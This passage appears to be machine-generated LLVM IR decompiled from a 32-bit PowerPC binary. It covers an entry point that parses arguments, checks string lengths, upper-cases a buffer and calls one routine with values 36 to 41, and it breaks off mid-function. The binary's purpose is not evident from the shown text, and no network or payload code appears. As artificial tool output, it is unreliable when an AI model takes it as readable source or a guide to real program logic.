  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1001e9ac.4 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1001e9ac.4 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1001e9ac.4 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_1001eb80.2, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_1001eb80.2, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @function_1000014c() local_unnamed_addr {
dec_label_pc_1000014c:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @function_10000168() local_unnamed_addr {
dec_label_pc_10000168:
  %v3_100001a0 = load i32, i32* inttoptr (i32 268560804 to i32*), align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %dec_label_pc_10000168
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %dec_label_pc_10000168
  ret i32 268560804
}

define i32 @function_100001d4() local_unnamed_addr {
dec_label_pc_100001d4:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_gt.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 0, i32* %r15.global-to-local, align 4
  store i32 0, i32* %r14.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %lr.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_10000210, i32* %r4.global-to-local, align 4
  %v2_10000214 = ptrtoint i32* %stack_var_4 to i32
  store i32 268464788, i32* %r3.global-to-local, align 4
  %v7_10000234 = call i32 @function_1000d038(i32 268464788, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 268492256, i32 %arg1)
  store i32 %v7_10000234, i32* %r3.global-to-local, align 4
  %v0_10000238 = load i32, i32* @r1, align 4
  %v2_10000238 = add i32 %v0_10000238, -20896
  %v3_10000238 = inttoptr i32 %v2_10000238 to i32*
  store i32 %v0_10000238, i32* %v3_10000238, align 4
  %v0_1000023c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_1000023c, i32* %r0.global-to-local, align 4
  %v0_10000240 = call i32 @__asm_mfcr()
  %v0_10000244 = load i32, i32* @r29, align 4
  %v1_10000244 = load i32, i32* @r1, align 4
  %v2_10000244 = add i32 %v1_10000244, 20884
  %v3_10000244 = inttoptr i32 %v2_10000244 to i32*
  store i32 %v0_10000244, i32* %v3_10000244, align 4
  store i32 %v2_10000214, i32* %r29.global-to-local, align 4
  %v0_1000024c = load i32, i32* @r22, align 4
  %v1_1000024c = load i32, i32* @r1, align 4
  %v2_1000024c = add i32 %v1_1000024c, 20856
  %v3_1000024c = inttoptr i32 %v2_1000024c to i32*
  store i32 %v0_1000024c, i32* %v3_1000024c, align 4
  %v0_10000254 = load i32, i32* @r23, align 4
  %v1_10000254 = load i32, i32* @r1, align 4
  %v2_10000254 = add i32 %v1_10000254, 20860
  %v3_10000254 = inttoptr i32 %v2_10000254 to i32*
  store i32 %v0_10000254, i32* %v3_10000254, align 4
  store i32 %v2_10000210, i32* %r22.global-to-local, align 4
  %v0_1000025c = load i32, i32* @r28, align 4
  %v1_1000025c = load i32, i32* @r1, align 4
  %v2_1000025c = add i32 %v1_1000025c, 20880
  %v3_1000025c = inttoptr i32 %v2_1000025c to i32*
  store i32 %v0_1000025c, i32* %v3_1000025c, align 4
  store i32 268435604, i32* %r4.global-to-local, align 4
  store i32 268435604, i32* %r28.global-to-local, align 4
  store i32 %v0_10000240, i32* %r23.global-to-local, align 4
  store i32 %v2_10000214, i32* %r3.global-to-local, align 4
  %v0_10000274 = load i32, i32* %r0.global-to-local, align 4
  %v1_10000274 = load i32, i32* @r1, align 4
  %v2_10000274 = add i32 %v1_10000274, 20900
  %v3_10000274 = inttoptr i32 %v2_10000274 to i32*
  store i32 %v0_10000274, i32* %v3_10000274, align 4
  %v1_10000278 = load i32, i32* @r1, align 4
  %v2_10000278 = add i32 %v1_10000278, 20820
  %v3_10000278 = inttoptr i32 %v2_10000278 to i32*
  store i32 %v0_10000240, i32* %v3_10000278, align 4
  %v0_1000027c = load i32, i32* @r20, align 4
  %v1_1000027c = load i32, i32* @r1, align 4
  %v2_1000027c = add i32 %v1_1000027c, 20848
  %v3_1000027c = inttoptr i32 %v2_1000027c to i32*
  store i32 %v0_1000027c, i32* %v3_1000027c, align 4
  %v0_10000280 = load i32, i32* @r1, align 4
  %v1_10000280 = add i32 %v0_10000280, 10540
  store i32 %v1_10000280, i32* %r20.global-to-local, align 4
  %v0_10000284 = load i32, i32* @r25, align 4
  %v2_10000284 = add i32 %v0_10000280, 20868
  %v3_10000284 = inttoptr i32 %v2_10000284 to i32*
  store i32 %v0_10000284, i32* %v3_10000284, align 4
  %v0_10000288 = load i32, i32* @r26, align 4
  %v1_10000288 = load i32, i32* @r1, align 4
  %v2_10000288 = add i32 %v1_10000288, 20872
  %v3_10000288 = inttoptr i32 %v2_10000288 to i32*
  store i32 %v0_10000288, i32* %v3_10000288, align 4
  %v0_1000028c = load i32, i32* @r27, align 4
  %v1_1000028c = load i32, i32* @r1, align 4
  %v2_1000028c = add i32 %v1_1000028c, 20876
  %v3_1000028c = inttoptr i32 %v2_1000028c to i32*
  store i32 %v0_1000028c, i32* %v3_1000028c, align 4
  %v0_10000290 = load i32, i32* @r31, align 4
  %v1_10000290 = load i32, i32* @r1, align 4
  %v2_10000290 = add i32 %v1_10000290, 20892
  %v3_10000290 = inttoptr i32 %v2_10000290 to i32*
  store i32 %v0_10000290, i32* %v3_10000290, align 4
  %v0_10000294 = load i32, i32* %r14.global-to-local, align 4
  %v1_10000294 = load i32, i32* @r1, align 4
  %v2_10000294 = add i32 %v1_10000294, 20824
  %v3_10000294 = inttoptr i32 %v2_10000294 to i32*
  store i32 %v0_10000294, i32* %v3_10000294, align 4
  %v0_10000298 = load i32, i32* %r15.global-to-local, align 4
  %v1_10000298 = load i32, i32* @r1, align 4
  %v2_10000298 = add i32 %v1_10000298, 20828
  %v3_10000298 = inttoptr i32 %v2_10000298 to i32*
  store i32 %v0_10000298, i32* %v3_10000298, align 4
  %v0_1000029c = load i32, i32* @r16, align 4
  %v1_1000029c = load i32, i32* @r1, align 4
  %v2_1000029c = add i32 %v1_1000029c, 20832
  %v3_1000029c = inttoptr i32 %v2_1000029c to i32*
  store i32 %v0_1000029c, i32* %v3_1000029c, align 4
  %v0_100002a0 = load i32, i32* @r17, align 4
  %v1_100002a0 = load i32, i32* @r1, align 4
  %v2_100002a0 = add i32 %v1_100002a0, 20836
  %v3_100002a0 = inttoptr i32 %v2_100002a0 to i32*
  store i32 %v0_100002a0, i32* %v3_100002a0, align 4
  %v0_100002a4 = load i32, i32* @r18, align 4
  %v1_100002a4 = load i32, i32* @r1, align 4
  %v2_100002a4 = add i32 %v1_100002a4, 20840
  %v3_100002a4 = inttoptr i32 %v2_100002a4 to i32*
  store i32 %v0_100002a4, i32* %v3_100002a4, align 4
  %v0_100002a8 = load i32, i32* @r19, align 4
  %v1_100002a8 = load i32, i32* @r1, align 4
  %v2_100002a8 = add i32 %v1_100002a8, 20844
  %v3_100002a8 = inttoptr i32 %v2_100002a8 to i32*
  store i32 %v0_100002a8, i32* %v3_100002a8, align 4
  %v0_100002ac = load i32, i32* @r21, align 4
  %v1_100002ac = load i32, i32* @r1, align 4
  %v2_100002ac = add i32 %v1_100002ac, 20852
  %v3_100002ac = inttoptr i32 %v2_100002ac to i32*
  store i32 %v0_100002ac, i32* %v3_100002ac, align 4
  %v0_100002b0 = load i32, i32* @r24, align 4
  %v1_100002b0 = load i32, i32* @r1, align 4
  %v2_100002b0 = add i32 %v1_100002b0, 20864
  %v3_100002b0 = inttoptr i32 %v2_100002b0 to i32*
  store i32 %v0_100002b0, i32* %v3_100002b0, align 4
  %v0_100002b4 = load i32, i32* @r30, align 4
  %v1_100002b4 = load i32, i32* @r1, align 4
  %v2_100002b4 = add i32 %v1_100002b4, 20888
  %v3_100002b4 = inttoptr i32 %v2_100002b4 to i32*
  store i32 %v0_100002b4, i32* %v3_100002b4, align 4
  store i32 268436156, i32* @lr, align 4
  %v5_100002b8 = call i32 @function_10001d50(i32 %v2_10000214, i32* inttoptr (i32 268435604 to i32*), i32 21, i32 0)
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_100002c0 = load i32, i32* @r1, align 4
  %v2_100002c0 = add i32 %v1_100002c0, 20804
  %v3_100002c0 = inttoptr i32 %v2_100002c0 to i32*
  store i32 %v5_100002b8, i32* %v3_100002c0, align 4
  %v0_100002cc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100002cc, i32* %r4.global-to-local, align 4
  store i32 %v2_10000214, i32* %r3.global-to-local, align 4
  store i32 268436184, i32* @lr, align 4
  %v5_100002d4 = inttoptr i32 %v0_100002cc to i32*
  %v6_100002d4 = call i32 @function_10001d50(i32 %v2_10000214, i32* %v5_100002d4, i32 20, i32 ptrtoint ([4 x i8]* @global_var_1000de40.7 to i32))
  %v0_100002d8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100002d8, i32* %r4.global-to-local, align 4
  store i32 %v6_100002d4, i32* %r25.global-to-local, align 4
  store i32 %v2_10000214, i32* %r3.global-to-local, align 4
  store i32 268436208, i32* @lr, align 4
  %v4_100002ec = inttoptr i32 %v0_100002d8 to i32*
  %v5_100002ec = call i32 @function_10001d50(i32 %v2_10000214, i32* %v4_100002ec, i32 8, i32 0)
  store i32 %v5_100002ec, i32* %r26.global-to-local, align 4
  %v0_10000300 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000300, i32* %r4.global-to-local, align 4
  store i32 %v2_10000214, i32* %r3.global-to-local, align 4
  store i32 268436236, i32* @lr, align 4
  %v4_10000308 = inttoptr i32 %v0_10000300 to i32*
  %v5_10000308 = call i32 @function_10001d50(i32 %v2_10000214, i32* %v4_10000308, i32 22, i32 ptrtoint (i32* @global_var_1000de44.8 to i32))
  %v0_1000030c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000030c, i32* %r4.global-to-local, align 4
  store i32 %v5_10000308, i32* %r27.global-to-local, align 4
  store i32 %v2_10000214, i32* %r3.global-to-local, align 4
  store i32 268436260, i32* @lr, align 4
  %v4_10000320 = inttoptr i32 %v0_1000030c to i32*
  %v5_10000320 = call i32 @function_1000235c(i32 %v2_10000214, i32* %v4_10000320, i32 24, i32 1)
  %v0_10000324 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000324, i32* %r4.global-to-local, align 4
  store i32 %v5_10000320, i32* %r31.global-to-local, align 4
  store i32 %v2_10000214, i32* %r3.global-to-local, align 4
  store i32 268436284, i32* @lr, align 4
  %v4_10000338 = inttoptr i32 %v0_10000324 to i32*
  %v5_10000338 = call i32 @function_1000235c(i32 %v2_10000214, i32* %v4_10000338, i32 7, i32 80)
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_10000340 = urem i32 %v5_10000338, 65536
  %v1_10000348 = load i32, i32* @r1, align 4
  %v2_10000348 = add i32 %v1_10000348, 20800
  %v3_10000348 = inttoptr i32 %v2_10000348 to i32*
  store i32 %v1_10000340, i32* %v3_10000348, align 4
  %v0_1000034c = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_1000034c, i32* %r3.global-to-local, align 4
  store i32 268436308, i32* @lr, align 4
  %v3_10000350 = call i32 @function_1000bc90(i32 %v0_1000034c, i32 0, i32 10241)
  store i32 %v3_10000350, i32* %r3.global-to-local, align 4
  %v0_10000354 = load i32, i32* %r26.global-to-local, align 4
  %v1_10000354 = icmp slt i32 %v0_10000354, 0
  %v2_10000354 = icmp sgt i32 %v0_10000354, 0
  %v3_10000354 = icmp eq i32 %v0_10000354, 0
  store i1 %v1_10000354, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000354, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000354, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000354, label %dec_label_pc_10000374, label %dec_label_pc_1000035c

dec_label_pc_1000035c:                            ; preds = %entry
  %v0_1000035c = load i32, i32* %r27.global-to-local, align 4
  %v1_1000035c = icmp slt i32 %v0_1000035c, 0
  %v2_1000035c = icmp sgt i32 %v0_1000035c, 0
  %v3_1000035c = icmp eq i32 %v0_1000035c, 0
  store i1 %v1_1000035c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000035c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000035c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000035c, label %dec_label_pc_10000374, label %dec_label_pc_10000364

dec_label_pc_10000364:                            ; preds = %dec_label_pc_1000035c
  store i32 %v0_1000035c, i32* %r3.global-to-local, align 4
  store i32 268436332, i32* @lr, align 4
  %v1_10000368 = inttoptr i32 %v0_1000035c to i8*
  %v2_10000368 = call i32 @function_1000ab64(i8* %v1_10000368)
  store i32 %v2_10000368, i32* %r3.global-to-local, align 4
  %v1_1000036c = icmp slt i32 %v2_10000368, 255
  %v2_1000036c = icmp sgt i32 %v2_10000368, 255
  %v3_1000036c = icmp eq i32 %v2_10000368, 255
  store i1 %v1_1000036c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000036c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000036c, i1* %cr7_eq.global-to-local, align 1
  %tmp65 = icmp slt i32 %v2_10000368, 256
  br i1 %tmp65, label %dec_label_pc_100003d4, label %dec_label_pc_10000374

dec_label_pc_10000374:                            ; preds = %dec_label_pc_100003e4, %dec_label_pc_100003d4, %dec_label_pc_10000364, %dec_label_pc_1000035c, %entry
  %v0_10000374 = load i32, i32* @r1, align 4
  %v1_10000374 = add i32 %v0_10000374, 20900
  %v2_10000374 = inttoptr i32 %v1_10000374 to i32*
  %v3_10000374 = load i32, i32* %v2_10000374, align 4
  store i32 %v3_10000374, i32* %r0.global-to-local, align 4
  %v1_10000378 = add i32 %v0_10000374, 20820
  %v2_10000378 = inttoptr i32 %v1_10000378 to i32*
  %v3_10000378 = load i32, i32* %v2_10000378, align 4
  %v1_1000037c = add i32 %v0_10000374, 20824
  %v2_1000037c = inttoptr i32 %v1_1000037c to i32*
  %v3_1000037c = load i32, i32* %v2_1000037c, align 4
  store i32 %v3_1000037c, i32* %r14.global-to-local, align 4
  store i32 %v3_10000374, i32* %lr.global-to-local, align 4
  %v1_10000384 = add i32 %v0_10000374, 20828
  %v2_10000384 = inttoptr i32 %v1_10000384 to i32*
  %v3_10000384 = load i32, i32* %v2_10000384, align 4
  store i32 %v3_10000384, i32* %r15.global-to-local, align 4
  %v1_10000388 = call %0 @__asm_mtcrf(i32 24, i32 %v3_10000378)
  %v0_1000038c = load i32, i32* @r1, align 4
  %v1_1000038c = add i32 %v0_1000038c, 20832
  %v2_1000038c = inttoptr i32 %v1_1000038c to i32*
  %v3_1000038c = load i32, i32* %v2_1000038c, align 4
  store i32 %v3_1000038c, i32* %r16.global-to-local, align 4
  %v1_10000390 = add i32 %v0_1000038c, 20836
  %v2_10000390 = inttoptr i32 %v1_10000390 to i32*
  %v3_10000390 = load i32, i32* %v2_10000390, align 4
  store i32 %v3_10000390, i32* %r17.global-to-local, align 4
  %v1_10000394 = add i32 %v0_1000038c, 20840
  %v2_10000394 = inttoptr i32 %v1_10000394 to i32*
  %v3_10000394 = load i32, i32* %v2_10000394, align 4
  store i32 %v3_10000394, i32* %r18.global-to-local, align 4
  %v1_10000398 = add i32 %v0_1000038c, 20844
  %v2_10000398 = inttoptr i32 %v1_10000398 to i32*
  %v3_10000398 = load i32, i32* %v2_10000398, align 4
  store i32 %v3_10000398, i32* %r19.global-to-local, align 4
  %v1_1000039c = add i32 %v0_1000038c, 20848
  %v2_1000039c = inttoptr i32 %v1_1000039c to i32*
  %v3_1000039c = load i32, i32* %v2_1000039c, align 4
  store i32 %v3_1000039c, i32* %r20.global-to-local, align 4
  %v1_100003a0 = add i32 %v0_1000038c, 20852
  %v2_100003a0 = inttoptr i32 %v1_100003a0 to i32*
  %v3_100003a0 = load i32, i32* %v2_100003a0, align 4
  store i32 %v3_100003a0, i32* %r21.global-to-local, align 4
  %v1_100003a4 = add i32 %v0_1000038c, 20856
  %v2_100003a4 = inttoptr i32 %v1_100003a4 to i32*
  %v3_100003a4 = load i32, i32* %v2_100003a4, align 4
  store i32 %v3_100003a4, i32* %r22.global-to-local, align 4
  %v1_100003a8 = add i32 %v0_1000038c, 20860
  %v2_100003a8 = inttoptr i32 %v1_100003a8 to i32*
  %v3_100003a8 = load i32, i32* %v2_100003a8, align 4
  store i32 %v3_100003a8, i32* %r23.global-to-local, align 4
  %v1_100003ac = add i32 %v0_1000038c, 20864
  %v2_100003ac = inttoptr i32 %v1_100003ac to i32*
  %v3_100003ac = load i32, i32* %v2_100003ac, align 4
  store i32 %v3_100003ac, i32* %r24.global-to-local, align 4
  %v1_100003b0 = add i32 %v0_1000038c, 20868
  %v2_100003b0 = inttoptr i32 %v1_100003b0 to i32*
  %v3_100003b0 = load i32, i32* %v2_100003b0, align 4
  store i32 %v3_100003b0, i32* %r25.global-to-local, align 4
  %v1_100003b4 = add i32 %v0_1000038c, 20872
  %v2_100003b4 = inttoptr i32 %v1_100003b4 to i32*
  %v3_100003b4 = load i32, i32* %v2_100003b4, align 4
  store i32 %v3_100003b4, i32* %r26.global-to-local, align 4
  %v1_100003b8 = add i32 %v0_1000038c, 20876
  %v2_100003b8 = inttoptr i32 %v1_100003b8 to i32*
  %v3_100003b8 = load i32, i32* %v2_100003b8, align 4
  store i32 %v3_100003b8, i32* %r27.global-to-local, align 4
  %v1_100003bc = add i32 %v0_1000038c, 20880
  %v2_100003bc = inttoptr i32 %v1_100003bc to i32*
  %v3_100003bc = load i32, i32* %v2_100003bc, align 4
  store i32 %v3_100003bc, i32* %r28.global-to-local, align 4
  %v1_100003c0 = add i32 %v0_1000038c, 20884
  %v2_100003c0 = inttoptr i32 %v1_100003c0 to i32*
  %v3_100003c0 = load i32, i32* %v2_100003c0, align 4
  store i32 %v3_100003c0, i32* %r29.global-to-local, align 4
  %v1_100003c4 = add i32 %v0_1000038c, 20888
  %v2_100003c4 = inttoptr i32 %v1_100003c4 to i32*
  %v3_100003c4 = load i32, i32* %v2_100003c4, align 4
  store i32 %v3_100003c4, i32* %r30.global-to-local, align 4
  %v1_100003c8 = add i32 %v0_1000038c, 20892
  %v2_100003c8 = inttoptr i32 %v1_100003c8 to i32*
  %v3_100003c8 = load i32, i32* %v2_100003c8, align 4
  store i32 %v3_100003c8, i32* %r31.global-to-local, align 4
  %v0_100003d0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100003d0

dec_label_pc_100003d4:                            ; preds = %dec_label_pc_10000364
  %v0_100003d4 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_100003d4, i32* %r3.global-to-local, align 4
  store i32 268436444, i32* @lr, align 4
  %v1_100003d8 = inttoptr i32 %v0_100003d4 to i8*
  %v2_100003d8 = call i32 @function_1000ab64(i8* %v1_100003d8)
  store i32 %v2_100003d8, i32* %r3.global-to-local, align 4
  %v1_100003dc = icmp slt i32 %v2_100003d8, 127
  %v2_100003dc = icmp sgt i32 %v2_100003d8, 127
  %v3_100003dc = icmp eq i32 %v2_100003d8, 127
  store i1 %v1_100003dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100003dc, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100003dc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100003dc, label %dec_label_pc_10000374, label %dec_label_pc_100003e4

dec_label_pc_100003e4:                            ; preds = %dec_label_pc_100003d4
  %v0_100003e4 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100003e4, i32* %r3.global-to-local, align 4
  store i32 268436460, i32* @lr, align 4
  %v1_100003e8 = inttoptr i32 %v0_100003e4 to i8*
  %v2_100003e8 = call i32 @function_1000ab64(i8* %v1_100003e8)
  store i32 %v2_100003e8, i32* %r3.global-to-local, align 4
  %v1_100003ec = icmp slt i32 %v2_100003e8, 9
  %v2_100003ec = icmp sgt i32 %v2_100003e8, 9
  %v3_100003ec = icmp eq i32 %v2_100003e8, 9
  store i1 %v1_100003ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100003ec, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100003ec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100003ec, label %dec_label_pc_10000374, label %dec_label_pc_100003f4

dec_label_pc_100003f4:                            ; preds = %dec_label_pc_100003e4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_100003f8 = load i32, i32* @r1, align 4
  %v2_100003f8 = add i32 %v1_100003f8, 8
  %v3_100003f8 = inttoptr i32 %v2_100003f8 to i32*
  store i32 0, i32* %v3_100003f8, align 4
  br label %dec_label_pc_100003fc

dec_label_pc_100003fc:                            ; preds = %dec_label_pc_10000430, %dec_label_pc_100003f4
  %v0_100003fc = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100003fc, i32* %r3.global-to-local, align 4
  store i32 268436484, i32* @lr, align 4
  %v1_10000400 = inttoptr i32 %v0_100003fc to i8*
  %v2_10000400 = call i32 @function_1000ab64(i8* %v1_10000400)
  store i32 %v2_10000400, i32* %r3.global-to-local, align 4
  %v0_10000404 = load i32, i32* @r1, align 4
  %v1_10000404 = add i32 %v0_10000404, 8
  %v2_10000404 = inttoptr i32 %v1_10000404 to i32*
  %v3_10000404 = load i32, i32* %v2_10000404, align 4
  store i32 %v3_10000404, i32* %r11.global-to-local, align 4
  %v2_10000408 = icmp slt i32 %v2_10000400, %v3_10000404
  %v3_10000408 = icmp sgt i32 %v2_10000400, %v3_10000404
  %v4_10000408 = icmp eq i32 %v2_10000400, %v3_10000404
  store i1 %v2_10000408, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000408, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10000408, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000408, label %dec_label_pc_10000410, label %dec_label_pc_1000043c

dec_label_pc_10000410:                            ; preds = %dec_label_pc_100003fc
  %v0_10000410 = load i32, i32* %r25.global-to-local, align 4
  %v2_10000410 = add i32 %v0_10000410, %v3_10000404
  %v3_10000410 = inttoptr i32 %v2_10000410 to i8*
  %v4_10000410 = load i8, i8* %v3_10000410, align 1
  %v5_10000410 = zext i8 %v4_10000410 to i32
  store i32 %v5_10000410, i32* %r9.global-to-local, align 4
  %v1_10000414 = add nuw nsw i32 %v5_10000410, 159
  %v1_10000418 = urem i32 %v1_10000414, 256
  store i32 %v1_10000418, i32* %r0.global-to-local, align 4
  %v1_1000041c = icmp ult i32 %v1_10000418, 25
  %v2_1000041c = icmp ugt i32 %v1_10000418, 25
  %v3_1000041c = icmp eq i32 %v1_10000418, 25
  store i1 %v1_1000041c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000041c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000041c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000041c, label %dec_label_pc_10000430, label %dec_label_pc_10000424

dec_label_pc_10000424:                            ; preds = %dec_label_pc_10000410
  %v1_10000424 = add nsw i32 %v5_10000410, -32
  store i32 %v1_10000424, i32* %r0.global-to-local, align 4
  %v3_10000428 = trunc i32 %v1_10000424 to i8
  store i8 %v3_10000428, i8* %v3_10000410, align 1
  %v0_1000042c = load i32, i32* @r1, align 4
  %v1_1000042c = add i32 %v0_1000042c, 8
  %v2_1000042c = inttoptr i32 %v1_1000042c to i32*
  %v3_1000042c = load i32, i32* %v2_1000042c, align 4
  store i32 %v3_1000042c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10000430

dec_label_pc_10000430:                            ; preds = %dec_label_pc_10000410, %dec_label_pc_10000424
  %v1_10000434 = phi i32 [ %v0_10000404, %dec_label_pc_10000410 ], [ %v0_1000042c, %dec_label_pc_10000424 ]
  %v0_10000430 = phi i32 [ %v3_10000404, %dec_label_pc_10000410 ], [ %v3_1000042c, %dec_label_pc_10000424 ]
  %v1_10000430 = add i32 %v0_10000430, 1
  store i32 %v1_10000430, i32* %r11.global-to-local, align 4
  %v2_10000434 = add i32 %v1_10000434, 8
  %v3_10000434 = inttoptr i32 %v2_10000434 to i32*
  store i32 %v1_10000430, i32* %v3_10000434, align 4
  br label %dec_label_pc_100003fc

dec_label_pc_1000043c:                            ; preds = %dec_label_pc_100003fc
  %v0_1000043c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000043c = icmp slt i32 %v0_1000043c, 256
  %v2_1000043c = icmp sgt i32 %v0_1000043c, 256
  %v3_1000043c = icmp eq i32 %v0_1000043c, 256
  store i1 %v1_1000043c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000043c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000043c, i1* %cr7_eq.global-to-local, align 1
  %v0_10000440. = select i1 %v2_1000043c, i32 256, i32 %v0_1000043c
  store i32 %v0_10000440., i32* %r21.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_10000450 = icmp slt i32 %v0_10000440., 0
  %v3_10000450 = icmp eq i32 %v0_10000440., 0
  store i1 %v1_10000450, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10000450, i1* %cr4_eq.global-to-local, align 1
  store i32 ptrtoint ([3 x i8]* @global_var_10000458.9 to i32), i32* @lr, align 4
  %v1_10000454 = call i32 @function_1000a2ec(i32 36)
  store i32 37, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000460.10 to i32), i32* @lr, align 4
  %v1_1000045c = call i32 @function_1000a2ec(i32 37)
  store i32 38, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000468.11 to i32), i32* @lr, align 4
  %v1_10000464 = call i32 @function_1000a2ec(i32 38)
  store i32 39, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000470.12 to i32), i32* @lr, align 4
  %v1_1000046c = call i32 @function_1000a2ec(i32 39)
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000478.13 to i32), i32* @lr, align 4
  %v1_10000474 = call i32 @function_1000a2ec(i32 40)
  store i32 41, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000480.14 to i32), i32* @lr, align 4
